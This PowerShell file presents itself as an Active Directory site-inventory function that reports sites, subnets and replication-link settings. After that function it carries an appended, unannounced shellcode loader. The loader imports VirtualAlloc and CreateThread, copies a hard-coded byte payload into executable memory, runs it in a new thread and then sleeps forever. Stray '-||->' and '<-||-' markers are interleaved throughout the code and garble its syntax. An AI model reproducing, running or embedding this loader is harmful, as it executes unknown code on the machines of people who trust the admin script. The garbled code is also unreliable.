 -||-> function Get-ADSiteInventory {

    [CmdletBinding()]
    PARAM()
    PROCESS
    {
         -||-> TRY{
            
             -||-> $ScriptName = ( -||-> Get-Variable -name MyInvocation -Scope 0 -ValueOnly <-||- ).Mycommand <-||- 

            
             -||-> Write-Verbose -message "[$ScriptName][PROCESS] Retrieve current Forest" <-||- 
             -||-> $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest() <-||- 
             -||-> Write-Verbose -message "[$ScriptName][PROCESS] Retrieve current Forest sites" <-||- 
             -||-> $SiteInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Sites <-||- 

            
             -||-> Write-Verbose -message "[$ScriptName][PROCESS] Create forest context" <-||- 
             -||-> $ForestType = [System.DirectoryServices.ActiveDirectory.DirectoryContexttype]"forest" <-||- 
             -||-> $ForestContext =  -||-> New-Object -TypeName System.DirectoryServices.ActiveDirectory.DirectoryContext -ArgumentList $ForestType,$Forest <-||-  <-||- 

            
             -||-> Write-Verbose -message "[$ScriptName][PROCESS] Retrieve RootDSE Configuration Naming Context" <-||- 
             -||-> $Configuration = ( -||-> [ADSI]"LDAP://RootDSE" <-||- ).configurationNamingContext <-||- 

            
             -||-> Write-Verbose -message "[$ScriptName][PROCESS] Get the Subnet Container" <-||- 
             -||-> $SubnetsContainer = [ADSI]"LDAP://CN=Subnets,CN=Sites,$Configuration" <-||- 

             -||-> FOREACH ($item in  -||-> $SiteInfo <-||- ){

                 -||-> Write-Verbose -Message "[$ScriptName][PROCESS] SITE: $( -||-> $item.name <-||- )" <-||- 

                
                 -||-> Write-Verbose -Message "[$ScriptName][PROCESS] SITE: $( -||-> $item.name <-||- ) - Getting Site Links" <-||- 
                 -||-> $LinksInfo = ( -||-> [System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::FindByName($ForestContext,$( -||-> $item.name <-||- )) <-||- ).SiteLinks <-||- 

                
                 -||-> Write-Verbose -Message "[$ScriptName][PROCESS] SITE: $( -||-> $item.name <-||- ) - Preparing Output" <-||- 

                 -||-> New-Object -TypeName PSObject -Property @{
                    Name=  -||-> $item.Name <-||- 
                    SiteLinks =  -||-> $item.SiteLinks -join "," <-||- 
                    Servers =  -||-> $item.Servers -join "," <-||- 
                    Domains =  -||-> $item.Domains -join "," <-||- 
                    Options =  -||-> $item.options <-||- 
                    AdjacentSites =  -||-> $item.AdjacentSites -join ',' <-||- 
                    InterSiteTopologyGenerator =  -||-> $item.InterSiteTopologyGenerator <-||- 
                    Location =  -||-> $item.location <-||- 
                    Subnets =  -||-> (  -||-> $info =  -||-> Foreach ($i in  -||-> $item.Subnets.name <-||- ){
                         -||-> $SubnetAdditionalInfo =  -||-> $SubnetsContainer.Children | Where-Object { -||-> $_.name -like "*$i*" <-||- } <-||-  <-||- 
                         -||-> "$i -- $( -||-> $SubnetAdditionalInfo.Description <-||- )" <-||-  } <-||-  <-||- ) -join "," <-||- 
                    

                    
                        SiteLinksCost =  -||-> $LinksInfo.Cost -join "," <-||- 
                        ReplicationInterval =  -||-> $LinksInfo.ReplicationInterval -join ',' <-||- 
                        ReciprocalReplicationEnabled =  -||-> $LinksInfo.ReciprocalReplicationEnabled -join ',' <-||- 
                        NotificationEnabled =  -||-> $LinksInfo.NotificationEnabled -join ',' <-||- 
                        TransportType =  -||-> $LinksInfo.TransportType -join ',' <-||- 
                        InterSiteReplicationSchedule =  -||-> $LinksInfo.InterSiteReplicationSchedule -join ',' <-||- 
                        DataCompressionEnabled =  -||-> $LinksInfo.DataCompressionEnabled -join ',' <-||- 
                    
                    
                } <-||- 
            } <-||- 
        }
        CATCH
        {
            
             -||-> $PSCmdlet.ThrowTerminatingError($_) <-||- 
        } <-||- 
    }
    END
    {
         -||-> Write-Verbose -Message "[$ScriptName][END] Script Completed!" <-||- 
    }
} <-||- 




 -||-> $a7b = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $a7b -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbf,0x6b,0x32,0xd6,0x19,0xd9,0xcc,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x03,0x7a,0x13,0x83,0xea,0x97,0xd0,0x23,0xe5,0x8f,0x97,0xcc,0x16,0x4f,0xf8,0x45,0xf3,0x7e,0x38,0x31,0x77,0xd0,0x88,0x31,0xd5,0xdc,0x63,0x17,0xce,0x57,0x01,0xb0,0xe1,0xd0,0xac,0xe6,0xcc,0xe1,0x9d,0xdb,0x4f,0x61,0xdc,0x0f,0xb0,0x58,0x2f,0x42,0xb1,0x9d,0x52,0xaf,0xe3,0x76,0x18,0x02,0x14,0xf3,0x54,0x9f,0x9f,0x4f,0x78,0xa7,0x7c,0x07,0x7b,0x86,0xd2,0x1c,0x22,0x08,0xd4,0xf1,0x5e,0x01,0xce,0x16,0x5a,0xdb,0x65,0xec,0x10,0xda,0xaf,0x3d,0xd8,0x71,0x8e,0xf2,0x2b,0x8b,0xd6,0x34,0xd4,0xfe,0x2e,0x47,0x69,0xf9,0xf4,0x3a,0xb5,0x8c,0xee,0x9c,0x3e,0x36,0xcb,0x1d,0x92,0xa1,0x98,0x11,0x5f,0xa5,0xc7,0x35,0x5e,0x6a,0x7c,0x41,0xeb,0x8d,0x53,0xc0,0xaf,0xa9,0x77,0x89,0x74,0xd3,0x2e,0x77,0xda,0xec,0x31,0xd8,0x83,0x48,0x39,0xf4,0xd0,0xe0,0x60,0x90,0x15,0xc9,0x9a,0x60,0x32,0x5a,0xe8,0x52,0x9d,0xf0,0x66,0xde,0x56,0xdf,0x71,0x21,0x4d,0xa7,0xee,0xdc,0x6e,0xd8,0x27,0x1a,0x3a,0x88,0x5f,0x8b,0x43,0x43,0xa0,0x34,0x96,0xfe,0xa5,0xa2,0xd9,0x57,0xa4,0x5f,0xb2,0xa5,0xa7,0x80,0xd2,0x23,0x41,0xee,0x82,0x63,0xde,0x4e,0x73,0xc4,0x8e,0x26,0x99,0xcb,0xf1,0x56,0xa2,0x01,0x9a,0xfc,0x4d,0xfc,0xf2,0x68,0xf7,0xa5,0x89,0x09,0xf8,0x73,0xf4,0x09,0x72,0x70,0x08,0xc7,0x73,0xfd,0x1a,0xbf,0x73,0x48,0x40,0x69,0x8b,0x66,0xef,0x95,0x19,0x8d,0xa6,0xc2,0xb5,0x8f,0x9f,0x24,0x1a,0x6f,0xca,0x3f,0x93,0xe5,0xb5,0x57,0xdc,0xe9,0x35,0xa7,0x8a,0x63,0x36,0xcf,0x6a,0xd0,0x65,0xea,0x74,0xcd,0x19,0xa7,0xe0,0xee,0x4b,0x14,0xa2,0x86,0x71,0x43,0x84,0x08,0x89,0xa6,0x14,0x74,0x5c,0x8e,0x62,0x94,0x5c <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $PtvX=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $PtvX.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$PtvX,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



